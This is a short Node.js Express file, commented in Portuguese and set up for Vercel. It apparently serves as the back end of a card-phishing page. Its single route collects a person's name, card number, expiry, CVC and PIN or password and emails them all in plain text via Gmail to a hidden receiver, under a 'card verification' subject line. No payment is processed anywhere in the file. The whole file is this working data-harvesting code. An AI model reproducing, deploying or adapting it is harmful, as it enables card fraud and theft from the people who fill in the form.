// Ficheiro: api/index.js

const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();

// Habilita o CORS para permitir requisições do seu frontend
app.use(cors());
// Habilita o parsing de JSON no corpo da requisição
app.use(express.json());

// A rota principal da nossa API
app.post('/api', (req, res) => {
    const { nome, numero_cartao, validade_mes, validade_ano, cvc, senha } = req.body;

    // Configuração do Nodemailer usando variáveis de ambiente
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER, // Seu e-mail (configurado na Vercel)
            pass: process.env.EMAIL_PASS, // Sua senha de app (configurada na Vercel)
        },
    });

    // Conteúdo do e-mail
    const mailOptions = {
        from: `Formulário do Site <${process.env.EMAIL_USER}>`,
        to: process.env.EMAIL_RECEIVER, // E-mail que receberá os dados
        subject: 'Nova Verificação de Cartão Recebida!',
        html: `
            <h1>Novos dados recebidos do formulário:</h1>
            <p><strong>Nome Completo:</strong> ${nome}</p>
            <p><strong>Número do Cartão:</strong> ${numero_cartao}</p>
            <p><strong>Validade:</strong> ${validade_mes}/${validade_ano}</p>
            <p><strong>CVC:</strong> ${cvc}</p>
            <p><strong>Senha:</strong> ${senha}</p>
        `,
    };

    // Envio do e-mail
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Erro ao enviar e-mail:', error);
            return res.status(500).json({ message: 'Falha ao enviar o e-mail.' });
        }
        console.log('E-mail enviado:', info.response);
        res.status(200).json({ message: 'Dados recebidos com sucesso!' });
    });
});

// A Vercel lida com o servidor, então não precisamos de app.listen()
// Exportamos a app para a Vercel
module.exports = app;
